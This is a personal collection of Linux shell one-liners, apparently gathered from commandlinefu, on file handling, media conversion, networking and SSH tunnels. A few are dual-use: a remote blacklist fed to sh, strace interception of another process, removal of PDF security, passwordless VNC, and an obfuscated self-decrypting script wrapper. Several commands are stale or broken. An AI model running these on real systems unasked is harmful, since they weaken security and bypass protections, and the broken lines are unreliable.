$> translate (){ wget -qO- "http://ajax.googleapis.com/ajax/services/language/translate?v=1.0&q=$1&langpair=$2|${3:-en}" | sed 's/.*"translatedText":"\([^"]*\)".*}/\1\n/'; }
## Google Translate.  Usage: translate <phrase> <source-language> <output-language>
## Example: translate hello en es
## See this for a list of language codes: http://en.wikipedia.org/wiki/List_of_ISO_639-1_codes
##==========================================
## Insert the results of an autocompletion in the command line
## Pressing ESC then * will insert in the command line the results of the autocompletion.
## It is hard to explain but if you look the sample output or do
$> ESC *
$> echo ESC *
## you will understand quickly.
## - Hold ESC does the same thing as tab tab
## - 'ESC .' inserts the last argument of last command (can be done many times in order to get the last argument of all previous commands)
##==========================================
## replace spaces in filenames with underscores
$> rename 'y/ /_/' *
## This command will replace all the spaces in all the filenames of the current directory with underscores. There are other commands that do this here, but this one is the easiest and shortest
##==========================================
## Create a CD/DVD ISO image from disk.
## Many like to use 'dd' for creating CD/DVD iso images. This is bad. Very bad. The reason this is, is 'dd' does not have any built-in error checking. So, you do not know if you got all the bits or not. As such, it is not the right tool for the job. Instead, 'reaom' (read optical media) from the wodim package is what you should be using. It has built-in error checking. Similarly, if you want to burn your newly creating ISO, stay away from 'dd', and use:
## wodim -v -eject /path/to/image.iso
$> readom dev=/dev/scd0 f=/path/to/image.iso
##==========================================
## Create iso from cue bin files
$> bchunk sr-wrmrd.bin sr-wrmrd.cue sr-wrmrd.iso
##==========================================
## intercept stdout/stderr of another process
$> strace -ff -e trace=write -e write=1,2 -p SOME_PID
##==========================================
## Create a pdf version of a manpage
$> man -t manpage | ps2pdf - filename.pdf
##==========================================
## Edit a file on a remote host using vim
$> vim scp:[email protected]//path/to/somefile
##==========================================
## Graph # of connections for each hosts.
$> netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | awk '{ printf("%s\t%s\t",$2,$1) ; for (i = 0; i < $1; i++) {printf("*")}; print "" }'
## Written for linux, the real example is how to produce ascii text graphs based on a numeric value (anything where uniq -c is useful is a good candidate).
##==========================================
## Record a screencast and convert it to an mpeg. Grab X11 input and create an MPEG at 25 fps with the resolution 800x600
$> ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 /tmp/outputFile.mpg
##==========================================
## Show numerical values for each of the 256 colors in bash
$> for code in {0..255}; do echo -e "\e[38;05;${code}m $code: Test"; done
## Same as http://www.commandlinefu.com/commands/view/5876, but for bash.
## This will show a numerical value for each of the 256 colors in bash. Everything in the command is a bash builtin, so it should run on any platform where bash is installed. Prints one color per line. If someone is interested in formatting the output, paste the alternative.
##==========================================
## Remove security limitations from PDF documents using ghostscript
$> gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrite -f INPUT.pdf
## Remove security from PDF document using this very simple command on Linux and OSX. You need ghostscript for this baby to work.
##==========================================
## Search commandlinefu.com from the command line using the API. Usage: cmdfu hello world
$> cmdfu (){ curl "http://www.commandlinefu.com/commands/matching/$@/$(echo -n $@ | openssl base64)/plaintext"; }
##==========================================
## Download all images from a site
$> wget -r -l1 --no-parent -nH -nd -P/tmp -A".gif,.jpg" http://example.com/images
## This recursively downloads all images from a given website to your /tmp directory. The -nH and -nd switches disable downloading of the directory structure.
##==========================================
## Compare two directory trees.
$> diff <(cd dir1 && find | sort) <(cd dir2 && find | sort)
##==========================================
## Quick access to ASCII code of a key
$> showkey -a
##==========================================
$> find . -type f -newermt "2010-01-01" ! -newermt "2010-06-01"
## Find files in a specific date range - in this case, the first half of last year.
## -newermt = modification time of the file is more recent than this date
## GNU find allows any date specfication that GNU date would accept, e.g.
$> find . -type f -newermt "3 years ago" ! -newermt "2 years ago"
## or
$> find . -type f -newermt "last monday"
##==========================================
## Block known dirty hosts from reaching your machine
$> wget -qO - http://infiltrated.net/blacklisted | awk '!/#|[a-z]/&&/./{print "iptables -A INPUT -s "$1" -j DROP"}'
## Blacklisted is a compiled list of all known dirty hosts (botnets, spammers, bruteforcers, etc.) which is updated on an hourly basis. This command will get the list and create the rules for you, if you want them automatically blocked, append |sh to the end of the command line. Its a more practical solution to block all and allow in specifics however, there are many who do not or cant do this which is where this script will come in handy. For those using ipfw, a quick fix would be {print add deny ip from "$1" to any}. Posted in the sample output are the top two entries. Be advised the blacklisted file itself filters out RFC1918 addresses (10.x.x.x, 172.16-31.x.x, 192.168.x.x) however, it is advisable you check/parse the list before you implement the rules
##==========================================
## Python version 3: Serve current directory tree at http://$HOSTNAME:8000/
$> python -m http.server 8000
## In Python version 3, the module was merged into http.server. Gentlemen, change your aliases.
##==========================================
$> echo $(sudo lshw -businfo | grep -B 1 -m 1 $(df "/path/to/file" | tail -1 | awk '{print $1}' | cut -c 6-8) | head -n 1 | awk '{print $1}' | cut -c 5- | tr ":" "-") | sudo tee /sys/bus/usb/drivers/usb/unbind
## Given a file path, unplug the USB device on which the file is located (the file must be on an USB device !)
## Apply this command (using the file path of anything on your device) and it will simulate the unplug of this device.
## If you just want the port, just type :
$> echo $(sudo lshw -businfo | grep -B 1 -m 1 $(df "/path/to/file" | tail -1 | awk '{print $1}' | cut -c 6-8) | head -n 1 | awk '{print $1}' | cut -c 5- | tr ":" "-")
##==========================================
## Remove blank lines from a file using grep and save output to new file
$> grep . filename > newfilename
##==========================================
## Get the IP of the host your coming from when logged in remotely.
$> echo ${SSH_CLIENT%% *}
##==========================================
## find all file larger than 500M
$> find / -type f -size +500M
##==========================================
## Intersection between two files
$> grep -Fx -f file1 file2
## Differences between two files
$> grep -v -Fx -f file1 file2
##==========================================
$> bc <<< 'obase=60;299'
## Convert seconds into minutes and seconds
## This is a very simple way to input a large number of seconds and get a more useful value in minutes and seconds. Avoids useless use of echo.
##==========================================
## Create banner from output
$> figlet
##==========================================
$> grep -rl oldstring . | xargs sed -i -e 's/oldstring/newstring/'
## recursive search and replace old with new string, inside files
## recursively traverse the directory structure from . down, look for string "oldstring" in all files, and replace it with "newstring", wherever found
## or
$> grep -rl oldstring . | xargs perl -pi~ -e 's/oldstring/newstring'
##==========================================
## NOT WORKING
## Download Youtube video with wget!
$> wget http://www.youtube.com/watch?v=dQw4w9WgXcQ -qO- | sed -n "/fmt_url_map/{s/[\'\"\|]/\n/g;p}" | sed -n '/^fmt_url_map/,/videoplayback/p' | sed -e :a -e '$q;N;5,$D;ba' | tr -d '\n' | sed -e 's/\(.*\),\(.\)\{1,3\}/\1/' | wget -i - -O surprise.flv
##==========================================
## Sort the size usage of a directory tree by gigabytes, kilobytes, megabytes, then bytes.
$> du -b --max-depth 1 | sort -nr | perl -pe 's{([0-9]+)}{sprintf "%.1f%s", $1>=2**30? ($1/2**30, "G"): $1>=2**20? ($1/2**20, "M"): $1>=2**10? ($1/2**10, "K"): ($1, "")}e'
##==========================================
## Convert PNG to GIF
$> for file in *.png; do convert "$file" "$(basename $file .png).gif"; done
##==========================================
## Paste hardware list (hwls) in html format into pastehtml.com directly from console and return URI.
$> listhw () { curl -s -S --data-urlencode "txt=$(sudo lshw -html)" "http://pastehtml.com/upload/create?input_type=html&result=address";echo;}
##==========================================
## Recursive Search and Replace
$> perl -pi -e 's/<what to find>/<what to replace it with>/g' 'grep -Rl <what to find> /<dir>/*'
##==========================================
# Replace spaces in a filename with hyphens
$> rename 's/ /-/g' *
##==========================================
# Console clock
$> watch -t -n1 'date "+%r %F %A"'
##==========================================
# mix video and audio
$> ffmpeg -i video.mp4 -i audio.mp3 -vcodec copy -acodec copy -map 0.0:0 -map 1.0:1mix.mp4
##==========================================
# remove newlines from specific lines in a file using sed
$> sed -i '/pattern/N; s/\n//' filename
##==========================================
## NOT WORKING curl: (6) Could not resolve host: weather.yahooapis.com
## Get sunrise and sunset times
$> l=12765843;curl -s http://weather.yahooapis.com/forecastrss?w=$l |grep astronomy|awk -F\" '{print $2 "\n" $4;}'
##==========================================
# Replicate a directory structure dropping the files
$> find . -type d -exec mkdir -p $DESTDIR/{} \;
##==========================================
## Find video encoded with h264
$> find -type f -exec bash -c 'if ffmpeg -i "{}" 2>&1 | grep -qi h264 ; then echo "{}"; fi' \;
##==========================================
## List the number and type of active network connections
$> netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
##==========================================
## Gives warning then requires the user to press enter key before executing the command.
$> echo "Your_Warning_Here" ; read -p "Press [enter] to continue..." ; Your_Command_here
$> echo "This will list contents. Press cntl-c to cancel, or" ; read -p "Press [enter] to continue..." ; ls
## Or require any key to be pressed.
$> echo "Your_Warning_Here" ; read -rsn 1 -p "Press any key to continue..." ; Your_Command_here
## If using a pipe | get input
$> read -rsn 1 -p "Press any key to continue..." < /dev/tty
##  Use a Countdown to cancel
$> printf 'WARNING: You are about to do something stupid.\n'
$> printf 'Press a key within 5 seconds to cancel.'
$> if ! read -rsn 1 -t 5
$> then something_stupid
$> fi
##==========================================
## Speed up launch of firefox. Compress information DBs of firefox to speed up the launch of browser.
$> find ~ -name '*.sqlite' -exec sqlite3 '{}' 'VACUUM;' \;
##==========================================
## Perform a branching conditional
$> true && { echo success;} || { echo failed; }
## This will perform one of two blocks of code, depending on the condition of the first. Essentially is a bash terniary operator.
## To tell if a machine is up:
$> ping -c1 machine { echo succes;} || { echo failed; }
## Because of the bash { } block operators, you can have multiple commands
$> ping -c1 machine && { echo success;log-timestamp.sh }|| { echo failed; email-admin.sh; }
##==========================================
## Recover a deleted file
$> grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt
## grep searches through a file and prints out all the lines that match some pattern. Here, the pattern is some string that is known to be in the deleted file. The more specific this string can be, the better. The file being searched by grep (/dev/sda1) is the partition of the hard drive the deleted file used to reside in. The ?-a? flag tells grep to treat the hard drive partition, which is actually a binary file, as text. Since recovering the entire file would be nice instead of just the lines that are already known, context control is used. The flags ?-B 25 -A 100? tell grep to print out 25 lines before a match and 100 lines after a match. Be conservative with estimates on these numbers to ensure the entire file is included (when in doubt, guess bigger numbers). Excess data is easy to trim out of results, but if you find yourself with a truncated or incomplete file, you need to do this all over again. Finally, the ?> results.txt? instructs the computer to store the output of grep in a file called results.txt.
## Source: http://spin.atomicobject.com/2010/08/18/undelete?utm_source=y-combinator&utm_medium=social-media&utm_campaign=technical
##==========================================
## convert filenames in current directory to lowercase
$> rename 'y/A-Z/a-z/' *
##==========================================
## Cut out a piece of film from a file. Choose an arbitrary length and starting time.
$> ffmpeg -vcodec copy -acodec copy -i orginalfile.mp4 -ss 00:01:30 -t 0:0:20 newfile.mp4
## -vcodec, you choose what video codec the new file should be encoded with.
## List all available video and audio encoders and file formats.
$> ffmpeg -formats E
## copy, you choose the video encoder that just copies the file.
## -acodec, you choose what audio codec the new file should be encoded with.
## copy, you choose the audio encoder that just copies the file.
## -i originalfile, you provide the filename of the original file to ffmpeg
## -ss 00:01:30, you choose the starting time on the original file in this case 1 min and 30 seconds into the film
## -t 0:0:20, you choose the length of the new film newfile, you choose the name of the file created.
## Here is more information of how to use ffmpeg: http://www.ffmpeg.org/ffmpeg-doc.html
##==========================================
## List all available video and audio encoders and file formats.
$> ffmpeg -formats E
##==========================================
## Generate a 4 random word password, better than one obfuscated word
$> cat /usr/share/dict/words | grep -v "'s" | shuf -n4 | tr -d '\n' && echo
$> echo 'New xkcd Password:' ; cat /usr/share/dict/words | grep -v "'s" | shuf -n4 | tr -d '\n' && echo
$> shuf -n4 /usr/share/dict/words | tr -d '\n'  # This includes possessive nouns
## http://xkcd.com/936/
##==========================================
## Play "foo.mpg" in your terminal using ASCII characters
$> mplayer -vo aa foo.mpg
##==========================================
## Setup, Files, Info, Networking, Text, Multimedia
## Suspend to ram
$> dbus-send --system --print-reply --dest=org.freedesktop.UPower /org/freedesktop/UPower org.freedesktop.UPower.Suspend
##==========================================
## Files, Text,
## Comment out all lines in a file beginning with string
$> sed -i 's/^\(somestring\)/#\1/' somefile.cfg
$> | sed 's/^\(somestring\)/#\1/'
##==========================================
## Multimedia
## SoX recording audio and trimming silence. Awesome!!!
$> sox -t alsa default ./recording.flac silence 1 0.1 5% 1 2.0 5%
## Records audio from your mic in FLAC (Free Lossless Audio Codec) format, starts only after it detects at least 0.1 seconds of noise and stops after 2 second of silence. You can adjust the percent values (sensitivity) to best fit your microphone and voice (0.1% if you have a great quality mic, higher if you do not, 0% does not trim anything).
## Useful for speech recognition in conjunction with my previous command titled 'Google voice recognition "API"' (http://www.commandlinefu.com/commands/view/8043/google-voice-recognition-api).
##==========================================
## Multimedia
## Record audio from microphone or sound input from the console
$> sox -t ossdsp -w -s -r 44100 -c 2 /dev/dsp -t raw - | lame -x -m s - File.mp3
## ??? working?
$> sox -t ossdsp -w -s -r 16000 -c 2 /dev/dsp -t raw ./recording.flac
##==========================================
## Voice to text. NOT WORKING??? Google Changed Things :(
## Google voice recognition "API" Use above sox recordings
## The FLAC audio must be encoded at 16000Hz sampling rate (SoX is your friend).
## Outputs a short JSON string, the actual speech is in the hypotheses->utterance, the accuracy is stored in hypotheses->confidence (ranging from 0 to 1).
$> wget -q -U "Mozilla/5.0" --post-file recording.flac --header="Content-Type: audio/x-flac; rate=16000" -O - "http://www.google.com/speech-api/v1/recognize?lang=en-us&client=chromium"
##==========================================
## Files, Text,
## Recurse and print matching lines (GNU grep):
$> grep -r -- "$search" .
##==========================================
## Networking,
## Single use vnc-over-ssh connection
$> ssh -f -L 5900:localhost:5900 user@your.ssh.server "x11vnc -safer -localhost -nopw -once -display :0"; vinagre localhost:5900
## SSH into a machine
## Tunnels VNC port to your local computer ("-L 5900:localhost:5900")
## Runs a single use vnc server ("x11vnc -safer -localhost -nopw -once -display :0")
## Goes into the background ("-f")
## Runs VNC viewer on the local computer connecting to the remote machine via the newly created SSH tunnel ("vinagre localhost:5900")
## Sometimes need to run 'ssh -f -L 5900:localhost:5900 user@your.ssh.server "x11vnc -safer -localhost -nopw -once -display :0"; vinagre localhost:5900' as is without putting in the host name.
##==========================================
## Info,
## Limit the cpu usage of a process
$> sudo cpulimit -p pid -l 50
## This will limit the average amount of CPU it consumes.
##==========================================
## Single Line Twitter-Tracker
$> WRDS="word1 word2 wordN"; while [ 1 ];do curl -s http://twitter.com/statuses/public_timeline.rss grep '<description>' cut -d '>' -f 2 cut -d '<' -f 1 > .twitt.tmp && for word in $WRDS;do grep --color=auto -i $word .twtt.tmp;done;sleep 300;done
## Ssh functions
#$> function slak()
#$> {
#$>     if [ $# -lt 2 ]; then
#$>         echo "add public key to securelink server"
#$>         echo "usage: skak [accountname] [sl port]"
#$>     else
#$>         cat /Volumes/Library/ssh/id_rsa-$1.pub | ssh -q lila@localhost -p $2 "if [ ! -d ~/.ssh/ ] ; then mkdir ~/.ssh ; fi ; chmod 700 ~/.ssh/ ; cat - >> ~/.ssh/authorized_keys ; chmod 600 ~/.ssh/authorized_keys"
#$>     fi
#$> }
#$>
#$> function slssh()
#$> {
#$>     if [ $# -lt 1 ]; then
#$>         echo "connect to securelink ssh session"
#$>         echo "usage slssh [port#]"
#$>         echo "ssh -p \$1 localhost"
#$>     else
#$>         ssh -p $1 localhost
#$>     fi
#$> }
#$>
#$> function slpg()
#$> {
#$>     if [ $# -lt 1 ]; then
#$>         echo "create securelink ssh tunnel for postgres"
#$>         echo "usage: slpg [port#]"
#$>         echo "ssh -N localhost -L 2345/localhost/5432 -p \$1"
#$>     else
#$>         ssh -N localhost -L 2345/localhost/5432 -p $1
#$>     fi
#$> }
#$>
#$> function sshmysql()
#$> {
#$> # bind MySQL hostport to forward remote MySQL connection to localhost
#$> ssh -L 13306:127.0.0.1:3306 -N $* &
#$> }
#$>
#$> function sshpg()
#$> {
#$>     if [ $# -lt 1 ]; then
#$>         echo "create ssh tunnel for postgres"
#$>         echo "usage: sshpg username@server"
#$>         echo "ssh -N \$1 -L 2345/localhost/5432"
#$>     else
#$>         ssh -N $1 -L 2345/localhost/5432
#$>     fi
#$> }
#$>
#$> function sshpg2()
#$> {
#$>     if [ $# -lt 1 ]; then
#$>         echo "create ssh tunnel for postgres"
#$>         echo "usage: sshpg username@server"
#$>         echo "ssh -N \$1 -L \$2/localhost/5432"
#$>     else
#$>         ssh -N $1 -L $2/localhost/5432
#$>     fi
#$> }
##==========================================
##################################################
# Spellchecking					 #
##################################################
###### I-Spell @ work: ENGLISH
# requires ispell: sudo apt-get install ispell
#$> function spell()
#$> {
#$>     local CHATTO
#$>     if [ $# -ne 1 ]; then
#$>         echo -e "\033[1;32mUSAGE: \033[33mis word_to_check\033[0m"
#$>     else
#$>         CHATTO=$( echo $* | awk '{print $1}' )
#$>         shift
#$>         echo -e "----------------------------------------------------->\n"
#$>         echo $CHATTO | ispell -a -m -B |grep -v "@"
#$>         echo -e "----------------------------------------------------->"
#$>     fi
#$> }
###### Google spell checker
$> function spellcheck() { typeset y=$@;curl -sd "<spellrequest><text>$y</text></spellrequest>" https://www.google.com/tbproxy/spell|sed -n '/s="[0-9]"/{s/<[^>]*>/ /g;s/\t/ /g;s/ *\(.*\)/Suggestions: \1\n/g;p}'|tee >(grep -Eq '.*'||echo -e "OK");}
###### spell checks either a Web page URL or a file
# requires ispell: sudo apt-get install ispell
#$> function webspell()
#$> {
#$> okaywords="$HOME/.okaywords"
#$> tempout="/tmp/webspell.$$"
#$> trap "/bin/rm -f $tempout" 0
#$> if [ $# -eq 0 ] ; then
#$>   echo "Usage: webspell file|URL" >&2;
#$> fi
#$> for filename
#$> do
#$>   if [ ! -f "$filename" -a "$(echo $filename|cut -c1-7)" != "http://" ] ; then
#$>      continue;      # picked up directory in '*' listing
#$>   fi
#$>   lynx -dump $filename | tr ' ' '\n' | sort -u | \
#$>     grep -vE "(^[^a-z]|')" | \
#$>     # adjust the following line to produce just a list of misspelled words
#$>     ispell -a | awk '/^\&/ { print $2 }' | \
#$>     sort -u > $tempout
#$>   if [ -r $okaywords ] ; then
#$>     # if you have an okaywords file, screen okay words out
#$>     grep -vif $okaywords < $tempout > ${tempout}.2
#$>     mv ${tempout}.2 $tempout
#$>   fi
#$>   if [ -s $tempout ] ; then
#$>     echo "Probable spelling errors: ${filename}"
#$>     echo '-------' ; cat $tempout ; echo '========='
#$>     cat $tempout | paste - - - -  | sed 's/^/  /'
#$>   fi
#$> done
#$> }
##==========================================
## Files, Networking,
## ix, command line patebin
## Examples:
##     ix hello.txt              # paste file (name/ext will be set).
##     echo Hello world. | ix    # read from STDIN (won't set name/ext).t
##     ix -n 1 self_destruct.txt # paste will be deleted after one read.
##     ix -i ID hello.txt        # replace ID, if you have permission.
##     ix -d ID
$> ix() { local opts; local OPTIND; [ -f "$HOME/.netrc" ] && opts='-n'; while getopts ":hd:i:n:" x; do case $x in h) echo "ix [-d ID] [-i ID] [-n N] [opts]"; return;; d) $echo curl $opts -X DELETE ix.io/$OPTARG; return;; i) opts="$opts -X PUT"; local id="$OPTARG";; n) opts="$opts -F read:1=$OPTARG";; esac; done; shift $(($OPTIND - 1)); [ -t 0 ] && { local filename="$1"; shift; [ "$filename" ] && { curl $opts -F f:1=@"$filename" $* ix.io/$id; return; } ; echo "^C to cancel, ^D to send."; } ; curl $opts -F f:1='<-' $* ix.io/$id; }
##==========================================
## Files, Networking,
## sprunge(1)
## NAME
##     sprunge: command line pastebin.
## SYNOPSIS
##     <command> | curl -F 'sprunge=<-' http://sprunge.us
## DESCRIPTION
##     add ?<lang> to resulting url for line numbers and syntax highlighting
##     use this form to paste from a browser
## EXAMPLES
##     ~$ cat bin/ching | curl -F 'sprunge=<-' http://sprunge.us
##        http://sprunge.us/aXZI
##     ~$ firefox http://sprunge.us/aXZI?py#n-7
## SEE ALSO
##     http://github.com/rupa/sprunge
## Posts a file to sprunge.us and copies the related url to the clipboard
$> function sprunge() { curl -s -F "sprunge=@$1" http://sprunge.us | xclip -selection clipboard && xclip -selection clipboard -o; }
##==========================================
## Files, Text,
## Create simple text file from command line or script (EOF is just a token, can be any word)
#cat > file.txt <<EOF
$> your text here
$> more text here
$> EOF
## or with tee
## Make multi line file and end with EOF
#$> sudo tee /etc/path/file << EOF
$> [multiline]
$> name=Info here
$> baseurl=https://site/
$> setting=1
$> enabled=1
$> EOF
##==========================================
## Files, Networking,
## Share a file between two computers
## receiver
$> nc -l 5566 > data-dump.sql
## sender
$> nc <receiver-ip-address> 5566 < data-dump.sql
##------------------------------------------
## Share a BIG file between two computers and show progress bar
## receiver
$> nc -l 5566 > big-file.iso
## sender
$> pv big-file.iso | nc <receiver-ip-address> 5566
##------------------------------------------
## Transfer a folder between two computers
## receiver
$> nc -l 5566 | tar -zxv
## sender
$> tar -zcv <folder> | nc -w1 <receiver-ip-address> 5566
##==========================================
## Files, Info, Networking,
## Compare a remote file with a local file
$> ssh user@host cat /path/to/remotefile | diff /path/to/localfile -
##==========================================
## Files, Info,
## Check which process is modifying a certain directory or file
$> auditctl -w /path/to/directory -p war
### see results with:
$> ausearch -f /path/to/directory
##==========================================
##------------------------------------------
#< Files, Info, Networking, Text, Multimedia
##------------------------------------------
##==========================================
## Networking,
## Internet Relay Chat irc
$> sudo apt-get install ircii
## Nickname
##>  /nick
## Add server
## List Channels
##>   /list
## Join Channel
##>   /join #channelname
##>   /j
## Private convo
##>   /msg
##>   /m
##------------------------------------------
##==========================================
#< Networking,
## Displays the quantity of connections to port 80 on a per IP basis
$> clear;while x=0; do clear;date;echo "";echo "  [Count] | [IP ADDR]";echo "-------------------";netstat -np|grep :80|grep -v LISTEN|awk '{print $5}'|cut -d: -f1|uniq -c; sleep 5;done
## Uses an infinite loop to display output from netstat, reformatted with grep, awk, and cut piped into uniq to provide the count. Complete with a pretty header. Polls every 5 seconds
##==========================================
#< Files, Info, Text,
## Show 10 Largest Open Files
$> lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail
## Show the largest 10 currently open files, the size of those files in Megabytes, and the name of the process holding the file open.
##==========================================
## Ban all IPs that attempted to access phpmyadmin on your site
$> grep "phpmyadmin" $path_to_access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP
##==========================================
## Create a thumbnail from the first page of a PDF file
$>  convert -thumbnail x80 file.pdf[0] thumb.png
## thumbnail x80 means create a thumbnail image of height 80 pixels, the width will be automatically chosen to make the image proportional. The [0] is to create a thumbnail for the first page only, without that a thumbnail image would be created for each page in the pdf file
## or all PDF files in a directory tree:
$> find /path/to/dir -name '*.pdf' -exec convert -thumbnail x80 {}[0] {}-thumb.png \;
##==========================================
## Send an http POST to a website with a file input field
$> curl -L -v -F "value=@myfile" "http://domain.tld/whatever.php"
##==========================================
## Convert all flac files in dir to mp3 320kbps using ffmpeg
$> for FILE in *.flac; do ffmpeg -i "$FILE" -b:a 320k "${FILE[@]/%flac/mp3}"; done;
##==========================================
## Open Windows internet shortcut (*.url) files in firefox
$> grep -i url='*' file.url | cut -b 5- | xargs firefox
##==========================================
## Remove all at jobs
$> atq | sed 's_\([0-9]\{1,8\}\).*_\1_g' | xargs atrm
##==========================================
## Random text generator
$> tr -dc a-z1-4 </dev/urandom | tr 1-2 ' \n' | awk 'length==0 || length>50' | tr 3-4 ' ' | sed 's/^ *//' | cat -s | fmt
##==========================================
## Download a file from a webserver with telnet
$> (echo 'GET /'; echo; sleep 1; ) | telnet www.google.com 80
##==========================================
##Create a transparent image of given dimensions
$> convert -size 100x100 xc:none transparency.png
##==========================================
## Insert lines from one text file to another one
$>  $ awk 'NR % 10 == 1 {getline f2 < "file1"; print f2} 1' file2 | cat -n
##==========================================
## Get streamed FLV from Chrome with lsof
$> export psid=$(pgrep -f libflashplayer.so); cp /proc/$psid/fd/$(lsof -p $psid | grep eleted | awk {' print $4 '} | sed -e "s/[a-z]//g") saved.flv
## first get the process id of the chome browser process which runs the flashplayer export it to a variable to be used later. Then we get in subshell the filedescriptor which is marked deleted and construct the /proc path for the in memory fileimage and copy it to the file named saved.flv
##==========================================
## Rename all files in a directory to upper case
$> for i in *; do mv "$i" "${i^^}"; done
## Rename all items in a directory to lower case
$> for i in *; do mv "$i" "${i,,}"; done
## or
$> paste <(ls) <(ls | tr A-Z a-z) | while read OLD NEW; do echo mv -v $OLD $NEW; done
##==========================================
## Remove EXIF data such as orientation from images
$> convert -strip orig.jpg stripped.jpg
## or
$> mogrify -strip /path/to/image.jpg
##==========================================
## Recording SSH sessions
$> ssh -l USER HOST | tee -a /path/to/file
## The -a option appends the output to the end of file instead of writing over it.
## You can also create an alias in ~/.bashrc to record your session when using ssh:
$> function sshlog () { \ssh $@ 2>&1 | tee -a $(date +%Y%m%d).log; }
$> alias ssh=sshlog
##==========================================
## Clear the swap space forcing everything back to main memory in Linux
$> sudo swapoff -a; sudo swapon -a
##==========================================
## Redirection operator to override the noclobber option
$> some_command >| output.txt
## Normally the > operator overwrites the target file.
## If the noclobber option is set (using: set -o noclobber), the > operator will fail if the target file exists.
## The >| overrides the noclobber setting and overwrites the target file.
## If the noclobber option is not set, then >| is equivalent to >, naturally.
##==========================================
## Convert a list of terms in slug format to capitalized words
$> sed -e 's/^./\U&/' -e 's/_./\U&/g' -e 's/_/ /g' /path/to/input
## The goal here is to take an input like this:
## police_station
## post_office
## real_estate_agency
## ... and convert it to an output like this:
## Police Station
## Post Office
## Real Estate Agency
##     -e ... the sed command can take several -e parameters, which will be executed one by one when processing each line in the input
##     The s/// command is a pattern replacement, and has the general format s/pattern/replacement/flags
##     s/^./\U&/ - replace the first letter of the line with uppercase version of the letter: \U means convert to uppercase, & is the matched string
##     s/_/ /g - replace all underscores with spaces
##     Input to sed can come from a list of files, or input redirection with <, or from a pipe.
##------------------------------------------
##  Convert line to no spaces line with first letter capital
##  Convert "this is a sentence to work with" to "ThisIsASentenceToWorkWith"
$> | sed -e 's/^./\U&/' -e 's/ ./\U&/g'  -e 's/ //g'
##==========================================
## Create or mount an encrypted directory using encfs
$> encfs -i 5 $PWD/raw $PWD/content
## The first time you run this, it will create an encrypted directory raw in the current working directory, and mount it on directory content in the same directory. It will ask a couple of questions:
#> Create directory "raw" ? -- answer "y"
#> Create directory "content" ? -- answer "y"
#> Choose configuration mode -- press enter, or "p" for paranoia mode
## The content directory will be visible and editable only by your user, and all the files you put inside will be saved encrypted under raw. The encrypted data is only visible when raw is mounted somewhere.
## The -i 5 means the content directory will be automatically unmounted after being idle for 5 minutes.
## You can manually unmount with umount ./content in Linux, and fusermount -u ./content in Mac OS.
## To mount raw again, simply re-run the same command. This time it will only ask for the password.
## encfs is not a standard command/package. Major Linux distros have it in their repos, on Mac OS you can install using ports. (sudo port install encfs)
##==========================================
## Expire a users password immediately
$> chage -d 0 USERNAME
##==========================================
## Resize an image proportionally to some specified width or height. 31x
$> convert -geometry x400 path/to/image.gif
## Replace image
$> mogrify -geometry x400 path/to/image.gif
##==========================================
## Find the target path a symlink is pointing to
$> readlink a_symbolic_link_to_somewhere
##==========================================
## Read the first line from a file and put it in a variable
$> read -r line < file
##==========================================
## Search through .doc files
$> function docsearch() { find -name '*.doc' | while read -r file; do catdoc "$file" | grep -l --label="$file" "$1"; done ; }
## or ?
$> function docsearch() { find -name \*.doc -exec sh -c "catdoc '{}' | grep -q '$1' && echo {}" \; }
##==========================================
## Search through .doc and .docx files
#!/bin/bash
$> echo -e "\n"
## Welcome to scandocs. This will search .doc AND .docx files in this directory for a given string. \n
## Type in the text string you want to find... \n
## read response
$> find . -name "*.doc" |
$> while read i; do catdoc "$i" |
$> grep --color=auto -iH --label="$i" "$response"; done
$> find . -name "*.docx" |
$> while read i; do docx2txt < "$i" |
$> grep --color=auto -iH --label="$i" "$response"; done
##------------------------------------------
$> find -name '*.doc' | while read -r file; do unoconv --format html "$file" | grep -l --label="$file"
##==========================================
## modified to get rid of autogenerated subs (who the hell needs them, unnecessary clutter) + formatted to get the highest quality MP4 video every time. plug the link to the channel you want to download in on the end and away you go
$> youtube-dl -f 43 -i https://www.youtube.com/user/MillennialWoes/videos
##------------------------------------------
$> youtube-dl --no-check-certificate --all-subs --no-mtime --no-overwrite --download-archive .archive --write-description --write-info-json --write-annotations --write-thumbnail --write-all-thumbnails --write-sub -f bestvideo[ext=mp4]+22,bestvideo[ext=mp4]+140 -o "%(upload_date)s - %(title)s [%(id)s].%(ext)s" https://www.youtube.com/user/MillionDollarExtreme
##==========================================
## Change owner of file moved to your home folder.
$> alias chownhome='sudo chown -R $USER:$USER ~/'
##==========================================
## Get a qrcode for a given string
$> echo "YourStringHere" | curl -F-=\<- qrenco.de
$> function qrcode() { echo "$1" | curl -F-=\<- qrenco.de ; }
##==========================================
## Bash scripts encryption and passphrase-protection
## This function will encrypt a bash script and will only execute it after providing the passphrase. Requires mcrypt to be installed on the system.
$>  scrypt(){ [ -n "$1" ]&&{ echo '. <(echo "$(tail -n+2 $0|base64 -d|mcrypt -dq)"); exit;'>$1.scrypt;cat $1|mcrypt|base64 >>$1.scrypt;chmod +x $1.scrypt;};}
$> cat hello
#!/bin/bash
#> case "$1" in
#> ""|-h) echo "This is the fantastic Hello World. Try this:" $(basename $0) "[entity]" ;;
#> moon) echo Good night. ;;
#> sun) echo Good morning. ;;
#> world) echo "Hello, world!" ;;
#> *) echo Hi, $@. ;;
#> esac
$> scrypt hello
#> Enter the passphrase (maximum of 512 characters)
#> Please use a combination of upper and lower case letters and numbers.
#> Enter passphrase:
#> Enter passphrase:
#> Stdin was encrypted.
$> cat hello.scrypt
#> . <(echo "$(/usr/bin/tail -n+2 $0|base64 -d|mcrypt -dq)");exit;
